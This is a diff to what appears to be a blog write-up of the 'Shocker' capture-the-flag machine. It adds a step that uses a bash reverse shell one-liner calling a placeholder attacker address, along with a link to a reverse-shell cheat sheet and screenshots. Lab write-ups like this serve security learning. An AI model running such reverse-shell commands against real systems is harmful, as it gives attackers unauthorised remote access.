@@ -82,8 +82,21 @@ This will list the contents in the directory. I'm going to insert the payload in
 
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/response.png)
 
-Looking at the response, we see that it prints out the directory contents, which means we have command execution.
+Looking at the response, we see that it prints out the directory contents, which means we have `command execution`
 
+In order to get a low-privilege shell, I am going to use the bash reverse shell one-liner.
+
+~~~
+$ bash -i >& /dev/tcp/YOURIP/PORT 0>&1
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+~~~
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/request2.png)
+
+Looking at our listener:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/revshell.png)
 
 
 
